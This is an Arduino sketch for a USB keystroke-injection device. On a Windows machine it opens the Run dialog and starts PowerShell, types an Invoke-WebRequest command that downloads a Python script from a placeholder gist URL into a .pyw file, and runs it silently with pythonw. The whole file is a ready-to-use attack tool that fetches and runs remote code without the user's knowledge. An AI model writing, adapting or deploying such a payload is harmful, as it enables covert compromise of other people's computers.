#include <Keyboard.h>

void typeAndEnter(const char* text, int waitAfter = 500) {
  Keyboard.print(text);
  delay(waitAfter);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(waitAfter);
}

void setup() {
  Keyboard.begin();

  delay(2000); 

 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print("powershell");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(2000); 

  
  Keyboard.print("Invoke-WebRequest -Uri \"YOUR_GIST_PYTHON_FILE\" ");
  Keyboard.print("| Select-Object -ExpandProperty Content ");
  Keyboard.print("| Out-File -Encoding utf8 -Append example.pyw");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(5000); 

  
  typeAndEnter("pythonw example.pyw", 1000);

  delay(3000);

  typeAndEnter("exit", 500);

  Keyboard.end();
}

void loop() {

}
